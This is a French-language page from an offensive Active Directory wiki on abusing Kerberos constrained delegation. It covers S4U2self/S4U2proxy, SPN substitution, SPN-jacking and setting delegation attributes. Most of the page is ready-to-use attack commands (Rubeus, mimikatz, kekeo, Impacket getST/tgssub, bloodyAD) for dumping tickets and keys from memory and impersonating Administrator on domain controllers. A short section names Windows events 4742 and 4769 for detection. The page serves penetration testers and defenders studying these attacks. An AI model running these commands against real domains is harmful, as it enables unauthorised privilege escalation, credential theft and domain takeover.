# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Avec cette configuration, un administrateur de domaine peut **autoriser** un ordinateur à **usurper l’identité d’un utilisateur ou d’un ordinateur** auprès de n’importe quel **service** d’une machine.

- **Service for User to self (_S4U2self_):** Tout **compte de service qui possède un SPN** peut généralement obtenir un TGS auprès de lui-même au nom d’un utilisateur quelconque. Si le compte possède également [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) dans _userAccountControl_, ce TGS est **transmissible**, ce qui rend la transition de protocole directement utile pour la **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Un **compte de service** peut obtenir un TGS au nom d’un utilisateur pour les SPN répertoriés dans **msDS-AllowedToDelegateTo**. Le ticket justificatif utilisé dans S4U2Proxy doit être un ticket **transmissible** destiné au service délégant : soit un véritable ticket client-service capturé sur la victime, soit un ticket généré avec **S4U2Self + T2A4D**.

**Remarque** : Si un utilisateur est marqué comme « _Le compte est sensible et ne peut pas être délégué_ » dans AD, ou s’il est membre de **Protected Users**, vous ne pourrez généralement **pas usurper son identité** par le biais de la délégation contrainte. Dans les domaines modernes, préférez le matériel **AES** aux hypothèses limitées à RC4 lorsque vous ciblez des comptes autorisés à déléguer.

Cela signifie que si vous **compromettez le hash du service**, vous pouvez **usurper l’identité d’utilisateurs** et obtenir un **accès** en leur nom à n’importe quel **service** sur les machines indiquées (élévation de privilèges possible).

De plus, vous **n’aurez pas seulement accès au service que l’utilisateur peut usurper, mais aussi à n’importe quel service**, car le SPN (le nom du service demandé) n’est pas vérifié (cette partie n’est ni chiffrée ni signée dans le ticket). Ainsi, si vous avez accès au **service CIFS**, vous pouvez également accéder au **service HOST** en utilisant, par exemple, l’option `/altservice` de Rubeus. La même faiblesse de substitution de SPN est exploitée par **Impacket getST -altservice** et d’autres outils.

De plus, l’accès au **service LDAP sur un DC** est nécessaire pour exploiter un **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Note opérateur :** ne vous fiez pas uniquement aux captures d’écran d’**ADUC** ou de BloodHound pour examiner les comptes **gMSA/sMSA**. Ces comptes masquent souvent l’onglet Delegation habituel ; énumérez donc directement les attributs bruts **`userAccountControl`** et **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Délégation contrainte avec transition de protocole vs Kerberos uniquement

Si le compte compromis possède **T2A4D**, vous pouvez généralement effectuer toute la chaîne **`S4U2Self -> S4U2Proxy`** avec uniquement la clé/le TGT du service.<sup>[[2]](#references)</sup>

S’il possède uniquement **`msDS-AllowedToDelegateTo`** (le mode classique **"Use Kerberos only"**), la délégation peut tout de même être exploitable, mais le ticket de preuve pour S4U2Proxy doit être un **ticket transférable utilisateur-vers-service** pour le service délégant. Une méthode consiste à capturer un TGS de la victime depuis **LSASS/ccache** et à le fournir à la deuxième étape (`/tgs:` dans Rubeus). Un ticket S4U2Self **non transférable** ne suffit **pas** pour la délégation contrainte classique ; si c’est votre seul ticket de preuve, consultez plutôt [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Une autre méthode, sous certaines conditions, consiste à effectuer un premier saut [RBCD](resource-based-constrained-delegation.md) vers le service délégant : s’il produit un ticket **transférable** pour l’utilisateur et le service visés, ce ticket peut être testé comme preuve pour un saut S4U2Proxy ultérieur en mode Kerberos uniquement. Vérifiez les indicateurs du premier ticket, le SPN du service délégant, sa liste d’autorisation des cibles et les éventuelles restrictions de délégation de l’utilisateur ; le contrôle d’un attribut RBCD ne suffit pas à établir le deuxième saut.

### Notes sur la délégation contrainte entre domaines (2025+)

Depuis **Windows Server 2012/2012 R2**, le KDC prend en charge la **délégation contrainte entre domaines/forêts** via les extensions S4U2Proxy. Les versions modernes (Windows Server 2016–2025) conservent ce comportement et ajoutent deux SID PAC pour signaler la transition de protocole :<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) lorsque l’utilisateur s’est authentifié normalement.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) lorsqu’un service a affirmé l’identité via la transition de protocole.

Lorsque la transition de protocole est utilisée entre domaines, attendez-vous à trouver `SERVICE_ASSERTED_IDENTITY` dans le PAC, ce qui confirme la réussite de l’étape S4U2Proxy.<sup>[[1]](#references)</sup>

### Outils Impacket / Linux (altservice et S4U complet)

Les versions récentes d’Impacket (0.11.x+) exposent la même chaîne S4U et le même remplacement de SPN que Rubeus :<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Si vous préférez forger d’abord le ST utilisateur (p. ex., avec un hash hors ligne uniquement), associez **ticketer.py** à **getST.py** pour S4U2Proxy. **tgssub.py** est également pratique si vous disposez déjà d’un ccache fonctionnel et devez seulement remplacer la classe de service pour le même hôte. Consultez l’issue Impacket #1713 pour connaître les problèmes actuels (KRB_AP_ERR_MODIFIED lorsque le ST forgé ne correspond pas à la clé du SPN).<sup>[[2]](#references)</sup>

### SPN-jacking : rediriger une cible de délégation contrainte

La délégation contrainte classique autorise une **chaîne SPN** dans `msDS-AllowedToDelegateTo`, et non un SID de cible immuable. Pendant S4U2Proxy, le KDC recherche le compte qui possède actuellement ce SPN et chiffre le ticket de service avec la clé à long terme de ce compte. Par conséquent, le contrôle du compte délégant, associé à `WriteSPN` sur un autre compte de service ou d’ordinateur, permet de rediriger une contrainte de délégation inchangée sans `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Il existe deux variantes :<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking :** le SPN autorisé est orphelin parce que son ancien propriétaire a été supprimé ou renommé, ou que le SPN lui a été retiré. Ajoutez-le directement au compte cible souhaité.
- **Live SPN-jacking :** le SPN appartient toujours à un compte source. La validation des SPN en double empêche normalement l’écriture sur la destination ; `WriteSPN` est donc nécessaire sur les deux objets : retirez le SPN de la source, ajoutez-le à la cible, obtenez le ticket, puis rétablissez l’enregistrement d’origine.

Le flux Linux abstrait ci-dessous déplace un SPN autorisé, exécute S4U en tant que principal délégant compromis, puis réécrit le nom de service du ticket pour utiliser un service pertinent sur la nouvelle cible.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` est la deuxième primitive, distincte de la première. Le ticket S4U2Proxy était chiffré pour le compte qui possède désormais `$DELEGATED_SPN` ; comme le nom du service du ticket (`sname`) se trouve hors du corps chiffré du ticket, les outils peuvent le remplacer par une autre classe de service/nom d’hôte dont le service utilise la même clé de compte. SPN-jacking modifie d’abord **la clé de compte** qui protège le ticket, tandis que la substitution de classe de service modifie **l’endroit où ce ticket est présenté**.<sup>[[5]](#references)[[6]](#references)</sup>

Pour un live jacking, inversez immédiatement les deux écritures LDAP après l’obtention du ticket afin d’éviter de perturber le service légitime. Sur les DC où l’audit des comptes d’ordinateur est activé, recherchez l’événement de sécurité **4742** lorsque `servicePrincipalName` est supprimé d’un ordinateur puis rapidement ajouté à un autre, en particulier lorsque le nom d’hôte du SPN diffère de `dNSHostName` de la destination. Faites le rapprochement avec l’événement **4769** : S4U2Self présente le même compte comme client/service, tandis que S4U2Proxy renseigne **Transited Services**.<sup>[[5]](#references)</sup>

### Configuration de la délégation sur un compte contrôlé

Cette méthode nécessite un **accès en écriture effectif** aux attributs de délégation du compte d’ordinateur ou de service (par exemple, `GenericAll`, ou `WriteDACL` suivi d’une modification de l’ACL) **et** le droit utilisateur `SeEnableDelegationPrivilege` pour le compte qui effectue la modification LDAP. Microsoft exige ce privilège lorsque `msDS-AllowedToDelegateTo` est modifié ; les droits de contrôle de l’objet seuls ne permettent pas de contourner cette exigence. Vérifiez ces deux prérequis avant d’utiliser un client LDAP tel que **bloodyAD** pour configurer la délégation avec transition de protocole.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Un compte ordinateur existant peut être candidat même lorsque `ms-DS-MachineAccountQuota` est égal à zéro ; ce quota limite la création par défaut de nouveaux ordinateurs, et non les droits sur un objet existant. Pour utiliser la délégation configurée, vous devez également contrôler la clé ou le mot de passe du compte délégant, disposer d’un nom de principal de service valide et cibler un utilisateur dont les identifiants peuvent être délégués. Ces conditions et les droits d’accès effectifs dans l’annuaire doivent être vérifiés séparément.

- Step 1: **Obtenir le TGT du service autorisé**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Il existe **d’autres moyens d’obtenir un ticket TGT** ou le **RC4** ou **AES256** sans être SYSTEM sur l’ordinateur, comme le Printer Bug, unconstrain delegation, NTLM relaying et Active Directory Certificate Service abuse
>
> **Avec ce ticket TGT (ou son hash), vous pouvez effectuer cette attaque sans compromettre l’ensemble de l’ordinateur.**

- Étape 2 : **Obtenir un TGS pour le service en usurpant l’identité de l’utilisateur**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Plus d’informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) et [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Présentation de la délégation Kerberos contrainte (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abus de la délégation avec Impacket (Partie 2) : délégation contrainte (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Délégation Kerberos contrainte (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity a tué le domaine : une présentation offensive de Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking : un cas limite d’abus de WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
